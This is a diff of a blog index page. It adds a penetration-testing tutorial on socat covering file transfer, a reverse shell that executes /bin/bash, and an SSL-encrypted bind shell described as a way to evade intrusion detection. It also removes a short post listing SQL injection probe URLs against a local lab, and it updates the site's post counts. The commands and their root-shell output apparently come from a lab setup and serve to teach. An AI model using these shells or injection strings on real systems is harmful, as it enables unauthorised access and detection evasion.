@@ -158,6 +158,107 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/12/05/Pentest-socat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/12/05/Pentest-socat/" class="post-title-link" itemprop="url">Socat</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-12-05 19:26:27" itemprop="dateCreated datePublished" datetime="2016-12-05T19:26:27-05:00">2016-12-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-21 18:00:20" itemprop="dateModified" datetime="2023-10-21T18:00:20-04:00">2023-10-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/Practical-Tools/" itemprop="url" rel="index"><span itemprop="name">Practical Tools</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/Practical-Tools/Socat/" itemprop="url" rel="index"><span itemprop="name">Socat</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Socat is a command-line utility that establishes two bidirectional byte streams and transfers data<br>between them. For penetration testing, it is similar to Netcat but has additional useful features.</p>
+<p>While there are a multitude of things that socat can do, we will only cover a few of them to illustrate<br>its use.</p>
+<h1 id="Socat-File-Transfers"><a href="#Socat-File-Transfers" class="headerlink" title="Socat File Transfers"></a>Socat File Transfers</h1><p>Server side:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat TCP4-LISTEN:443,fork file:nmap-list.txt </span><br></pre></td></tr></table></figure>
+
+<p>Client side:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat TCP4:192.168.244.140:443 file:nmap-list.txt ,create</span><br><span class="line">C:\Users\Administrator\Desktop\socat&gt; type nmap-list.txt</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 23:19 EDT</span><br><span class="line">Warning: 199.241.133.26 giving up on port because retransmission cap hit (10).</span><br><span class="line">Stats: 0:07:04 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h1 id="Socat-Reverse-Shells"><a href="#Socat-Reverse-Shells" class="headerlink" title="Socat Reverse Shells"></a>Socat Reverse Shells</h1><p>Server side:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT</span><br><span class="line">... socat[5640] N listening on AF=2 0.0.0.0:443</span><br></pre></td></tr></table></figure>
+<p>Client side:<br>When client side type follow command :</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat TCP4:192.168.244.140:443 EXEC:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>Then the server side , look like:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT</span><br><span class="line">... socat[5640] N listening on AF=2 0.0.0.0:443</span><br><span class="line">... socat[5640] N accepting connection from AF=2 192.168.244.140:54720 on 192.168.244.144:443</span><br><span class="line">... socat[5640] N using stdout for reading and writing</span><br><span class="line">... socat[5640] N starting data transfer loop with FDs [4,4] and [1,1]</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Socat-Encrypted-Bind-Shells"><a href="#Socat-Encrypted-Bind-Shells" class="headerlink" title="Socat Encrypted Bind Shells"></a>Socat Encrypted Bind Shells</h1><p>To add encryption to a bind shell, we will rely on Secure Socket Layer certificates. This level of<br>encryption will assist in evading intrusion detection systems (IDS) and will help hide the sensitive<br>data we are transceiving.<br>To continue with the example, we will use the openssl application to create a selfsigned certificate using the following options:<br>• req: initiate a new certificate signing request<br>• -newkey: generate a new private key<br>• rsa:2048: use RSA encryption with a 2,048-bit key length.<br>• -nodes: store the private key without passphrase protection<br>• -keyout: save the key to a file<br>• -x509: output a self-signed certificate instead of a certificate request<br>• -days: set validity period in days<br>• -out: save the certificate to a file</p>
+<p>Once we generate the key, we will cat the certificate and its private key into a file, which we will<br>eventually use to encrypt our bind shell.</p>
+<p>Server side:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</span><br><span class="line">...+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+.....+.+...+.....+......+.+......+.....+.......+.....+...............+.+.....+.+......+...+..+....+...+...+..................+.........+...+.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+......+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">.+.+......+...+..+.+.....+.........+......+...+.........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+....+........+....+.....+.+.....+...+.......+..+.......+........+.+.....+.+...+........+.........+..................+......+.........+......+..........+.........+..+....+.........+......+.........+...+..+...+....+........+......+.+.........+......+...........+...+.......+...........................+.....+.......+......+........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:CA</span><br><span class="line">State or Province Name (full name) [Some-State]:Quebec</span><br><span class="line">Locality Name (eg, city) []:Montreal</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:Raohua</span><br><span class="line">Organizational Unit Name (eg, section) []:Try Harder Department</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:</span><br><span class="line">Email Address []:</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash </span><br></pre></td></tr></table></figure>
+
+<p>Client side:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat - OPENSSL:192.168.244.140:443,verify=0</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 0=1000(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:f9:b4:b9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.140/24 brd 192.168.244.255 scope global dynamic noprefixroute eth0</span><br><span class="line">       valid_lft 1168sec preferred_lft 1168sec</span><br><span class="line">    inet6 fe80::9d6e:bd4e:a4b2:6ffb/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    link/ether 02:42:1d:28:b9:62 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2016/12/01/Pentest-nc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1071,93 +1172,6 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/20/SQLInjectionCharacter/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/10/20/SQLInjectionCharacter/" class="post-title-link" itemprop="url">Character-based SQL Injection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2016-10-20 21:55:22" itemprop="dateCreated datePublished" datetime="2016-10-20T21:55:22-04:00">2016-10-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 18:55:32" itemprop="dateModified" datetime="2023-10-18T18:55:32-04:00">2023-10-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Character-based SQL Injection</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Detection of character-based SQL Injection:</p>
-<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1229,19 +1243,19 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">57</span>
+        <span class="site-state-item-count">59</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
